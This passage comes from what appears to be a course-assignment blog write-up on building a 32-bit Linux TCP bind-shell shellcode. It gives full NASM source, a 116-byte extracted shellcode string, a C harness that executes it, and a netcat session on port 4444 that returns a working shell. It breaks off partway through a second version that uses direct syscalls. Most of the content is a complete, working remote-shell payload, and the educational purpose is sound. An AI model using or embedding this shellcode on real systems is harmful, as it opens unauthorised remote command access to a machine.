<span class="gp">__libc_start_main(0x804864b, 1, 0xbffff6b4, 0x80487f0 &lt;unfinished ...&gt;</span><span class="w">
</span><span class="go">htons(4444, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                        = 0x5c11
htonl(0, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                           = 0
socket(2, 1, 6)                                                                                                        = 3
bind(3, 0xbffff5ec, 16, 0xb7e320ec)                                                                                    = 0
listen(3, 0, 16, 0xb7e320ec)                                                                                           = 0
accept(3, 0, 0, 0xb7e320ec)                                                                                            = 4
dup2(4, 0)                                                                                                             = 0
dup2(4, 1)                                                                                                             = 1
dup2(4, 2)                                                                                                             = 2
</span><span class="gp">execve(0x80488c5, 0, 0, 0xb7e320ec &lt;no return ...&gt;</span><span class="w">
</span><span class="go">--- Called exec() ---
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="assembly-version"><span class="mr-2">Assembly version</span><a href="#assembly-version" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<hr />
<p>The assembly version follows the same logic flow previously used in the C protoype. First, registers are cleared to make sure there are no unintended side effects when testing the shellcode within the <code class="language-plaintext highlighter-rouge">shellcode.c</code> skeleton program. Initially, when I tested the code and didn’t clear out all registers, the ELF binary created by NASM worked ok but the shellcode inside the skeleton program crashed because EAX already had a value in the upper half of the register.</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="c1">; Zero registers</span>
<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
</pre></td></tr></tbody></table></code></div></div>

<p>For this shellcode version, I used the initial syscall used in earlier Linux versions where a single syscall was used to control all socket functions on the kernel. Newer Linux versions implement separate syscalls as indicated in the <code class="language-plaintext highlighter-rouge">socketcall</code> man page:</p>

<blockquote>
  <p>On a some architectures—for example, x86-64 and ARM—there is no
socketcall() system call; instead socket(2), accept(2), bind(2), and
so on really are implemented as separate system calls.</p>

  <p>On x86-32, socketcall() was historically the only entry point for the
sockets API.  However, starting in Linux 4.3, direct system calls are
provided on x86-32 for the sockets API.</p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">int socketcall(int call, unsigned long *args);</code></p>

<p><code class="language-plaintext highlighter-rouge">sys_socketcall</code> works a bit differently than other syscalls. The first argument (EBX register) contains the function name being called and the 2nd argument in ECX contains a pointer to a memory address containing the various arguments for the function.</p>

<p><code class="language-plaintext highlighter-rouge">/usr/include/linux/net.h</code> contains the following list of function calls:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">#define SYS_SOCKET  1       </span><span class="cm">/* sys_socket(2)        */</span><span class="cp">
#define SYS_BIND    2       </span><span class="cm">/* sys_bind(2)          */</span><span class="cp">
#define SYS_CONNECT 3       </span><span class="cm">/* sys_connect(2)       */</span><span class="cp">
#define SYS_LISTEN  4       </span><span class="cm">/* sys_listen(2)        */</span><span class="cp">
#define SYS_ACCEPT  5       </span><span class="cm">/* sys_accept(2)        */</span><span class="cp">
</span><span class="p">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Let’s take the socket creation as an example:</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c1">; Create socket</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x1</span>         <span class="c1">;   SYS_SOCKET</span>
<span class="nf">push</span> <span class="mh">0x6</span>            <span class="c1">; int protocol -&gt; IPPROTO_TCP</span>
<span class="nf">push</span> <span class="mh">0x1</span>            <span class="c1">; int type -&gt; SOCK_STREAM</span>
<span class="nf">push</span> <span class="mh">0x2</span>            <span class="c1">; int domain -&gt; AF_INET</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_SOCKET)</span>
<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save socket fd</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">EAX</code> contains <code class="language-plaintext highlighter-rouge">0x66</code> which is <code class="language-plaintext highlighter-rouge">sys_socketcall</code>, then EBX is set to <code class="language-plaintext highlighter-rouge">0x1</code> (SYS_SOCKET). Next the arguments for <code class="language-plaintext highlighter-rouge">socket()</code> itself are pushed on the stack then the value of the stack frame pointer is moved into <code class="language-plaintext highlighter-rouge">ECX</code>. When the function call returns, the descriptor value is saved into <code class="language-plaintext highlighter-rouge">EDI</code> so it can be used later.</p>

<p>The sockaddr_in struct is created as follows:</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="c1">; Create addr struct</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; sin.addr (0.0.0.0)</span>
<span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x5c11</span>    <span class="c1">; Port</span>
<span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x2</span>       <span class="c1">; AF_INET</span>
<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Since the addr struct needs to be 16 bytes, <code class="language-plaintext highlighter-rouge">$edx</code> is pushed twice to add 8 bytes of null padding. <code class="language-plaintext highlighter-rouge">$edx</code> is pushed a third time to define the listening address for the socket and finally the port number is pushed followed by the domain value for <code class="language-plaintext highlighter-rouge">AF_INET</code>.</p>

<p>For <code class="language-plaintext highlighter-rouge">bind</code>, we push the size of the addr struct (16 bytes), then its address which we saved to the <code class="language-plaintext highlighter-rouge">$esi</code> register earlier and the socket description from <code class="language-plaintext highlighter-rouge">$edi</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">; Bind socket</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x2</span>         <span class="c1">;   SYS_BIND</span>
<span class="nf">push</span> <span class="mh">0x10</span>           <span class="c1">; socklen_t addrlen</span>
<span class="nf">push</span> <span class="nb">esi</span>            <span class="c1">; const struct sockaddr *addr</span>
<span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_BIND)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">listen</code> and <code class="language-plaintext highlighter-rouge">accept</code> functions work the same way with the arguments being pushed on the stack and using <code class="language-plaintext highlighter-rouge">sys_socketcall</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c1">; Listen for connection</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x4</span>         <span class="c1">;   SYS_LISTEN</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; int backlog -&gt; NULL</span>
<span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_LISTEN)</span>

<span class="c1">; Accept connection</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x5</span>         <span class="c1">;   SYS_ACCEPT</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; socklen_t *addrlen -&gt; NULL</span>
<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; struct sockaddr *addr -&gt; NULL</span>
<span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved sock fd value</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_ACCEPT)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>To redirect IO to the descriptor, a loop with the <code class="language-plaintext highlighter-rouge">$ecx</code> register is used. Because of the way the loop instruction works (it exits when <code class="language-plaintext highlighter-rouge">$ecx</code> is 0), the <code class="language-plaintext highlighter-rouge">dec</code> and <code class="language-plaintext highlighter-rouge">inc</code> instruction are used here so we can still use the <code class="language-plaintext highlighter-rouge">$ecx</code> value to call <code class="language-plaintext highlighter-rouge">dup2</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">; Redirect STDIN, STDOUT, STDERR to socket</span>
<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
<span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x3</span>         <span class="c1">; counter for loop (stdin to stderr)</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; socket fd</span>

<span class="nl">dup2:</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3f</span>        <span class="c1">; sys_dup2</span>
<span class="nf">dec</span> <span class="nb">ecx</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_dup2</span>
<span class="nf">inc</span> <span class="nb">ecx</span>
<span class="nf">loop</span> <span class="nv">dup2</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">/bin/bash</code> program is used to spawn a shell, padding it with forward slashes so it is 4 bytes aligned. Because the string needs to be null-terminated, an garbage character (<code class="language-plaintext highlighter-rouge">A</code>) is added to string and is changed to a NULL with the subsequent <code class="language-plaintext highlighter-rouge">mov byte [esp + 11], al</code> instruction.</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">; execve()</span>
<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x41687361</span>     <span class="c1">; ///bin/bashA</span>
<span class="nf">push</span> <span class="mh">0x622f6e69</span>
<span class="nf">push</span> <span class="mh">0x622f2f2f</span>
<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">al</span> <span class="c1">; NULL terminate string</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>         <span class="c1">; sys_execve</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; const char *filename</span>
<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; char *const argv[]</span>
<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; char *const envp[]</span>
<span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_execve</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The final assembly code looks like this:</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre></td><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="c1">; Zero registers</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>

    <span class="c1">; Create socket</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x1</span>         <span class="c1">;   SYS_SOCKET</span>
    <span class="nf">push</span> <span class="mh">0x6</span>            <span class="c1">; int protocol -&gt; IPPROTO_TCP</span>
    <span class="nf">push</span> <span class="mh">0x1</span>            <span class="c1">; int type -&gt; SOCK_STREAM</span>
    <span class="nf">push</span> <span class="mh">0x2</span>            <span class="c1">; int domain -&gt; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_SOCKET)</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save socket fd</span>

    <span class="c1">; Create addr struct</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; sin.addr (0.0.0.0)</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x5c11</span>    <span class="c1">; Port</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x2</span>       <span class="c1">; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; Bind socket</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x2</span>         <span class="c1">;   SYS_BIND</span>
    <span class="nf">push</span> <span class="mh">0x10</span>           <span class="c1">; socklen_t addrlen</span>
    <span class="nf">push</span> <span class="nb">esi</span>            <span class="c1">; const struct sockaddr *addr</span>
    <span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_BIND)</span>

    <span class="c1">; Listen for connection</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x4</span>         <span class="c1">;   SYS_LISTEN</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; int backlog -&gt; NULL</span>
    <span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_LISTEN)</span>

    <span class="c1">; Accept connection</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x66</span>        <span class="c1">; sys_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x5</span>         <span class="c1">;   SYS_ACCEPT</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; socklen_t *addrlen -&gt; NULL</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; struct sockaddr *addr -&gt; NULL</span>
    <span class="nf">push</span> <span class="nb">edi</span>            <span class="c1">; int sockfd -&gt; saved sock fd value</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_ACCEPT)</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>

    <span class="c1">; Redirect STDIN, STDOUT, STDERR to socket</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x3</span>         <span class="c1">; counter for loop (stdin to stderr)</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; socket fd</span>

    <span class="nl">dup2:</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3f</span>        <span class="c1">; sys_dup2</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_dup2</span>
    <span class="nf">inc</span> <span class="nb">ecx</span>
    <span class="nf">loop</span> <span class="nv">dup2</span>

    <span class="c1">; execve()</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="mh">0x41687361</span>     <span class="c1">; ///bin/bashA</span>
    <span class="nf">push</span> <span class="mh">0x622f6e69</span>
    <span class="nf">push</span> <span class="mh">0x622f2f2f</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">al</span> <span class="c1">; NULL terminate string</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>         <span class="c1">; sys_execve</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; const char *filename</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; char *const argv[]</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; char *const envp[]</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_execve</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Compiling and linking the code…</p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="gp">slemire@slae:~/slae32/assignment1$</span><span class="w"> </span>../compile.sh shell_bind_tcp
<span class="go">[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
[+] Length: 116
[+] Done!
</span></pre></td></tr></tbody></table></code></div></div>

<p>Testing the ELF binary generated by NASM:</p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="gp">slemire@slae:~/slae32/assignment1$</span><span class="w"> </span>file shell_bind_tcp
<span class="go">shell_bind_tcp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
[...]
</span><span class="gp">slemire@slae:~/slae32/assignment1$</span><span class="w"> </span>./shell_bind_tcp
<span class="go">[...]
</span><span class="gp">slemire@slae:~$</span><span class="w"> </span>nc <span class="nt">-nv</span> 127.0.0.1 4444
<span class="go">Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</span></pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">shellcode.c</code> program is then used to test the shellcode as it would used in an actual exploit:</p>
<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span><span class="o">=</span><span class="s">"</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %d bytes.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The test program is compiled and tested:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>slemire@slae:~/slae32/assignment1$ gcc -o shellcode -fno-stack-protector -z execstack shellcode.c    
slemire@slae:~/slae32/assignment1$ ./shellcode
[...]
slemire@slae:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
whoami
slemire
</pre></td></tr></tbody></table></code></div></div>

<h3 id="2nd-version-using-syscalls"><span class="mr-2">2nd version using syscalls</span><a href="#2nd-version-using-syscalls" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<hr />
<p>The 2nd version of this bind shellcode uses the new syscalls. According to the following <a href="https://patchwork.kernel.org/patch/146431/">kernel patch</a>, sometimes in 2010 they added new syscall entries for non-multiplexed socket calls.</p>

<p>The ones that interest us are:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="cp">#define __NR_socket 359
#define __NR_bind 361
#define __NR_connect 362
#define __NR_listen 363
#define __NR_accept4 364
</span></pre></td></tr></tbody></table></code></div></div>

<p>Instead of using <code class="language-plaintext highlighter-rouge">sys_socketcall</code>, we can use those syscalls directly and put the arguments in the registers. The same code flow is used but the arguments are passed differently.</p>

<p>The second version of the shellcode looks like this:</p>

<div class="language-nasm highlighter-rouge"><div class="code-header">
        <span data-label-text="Nasm"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="c1">; Zero registers</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>

    <span class="c1">; Create socket</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x167</span>       <span class="c1">; sys_socket</span>
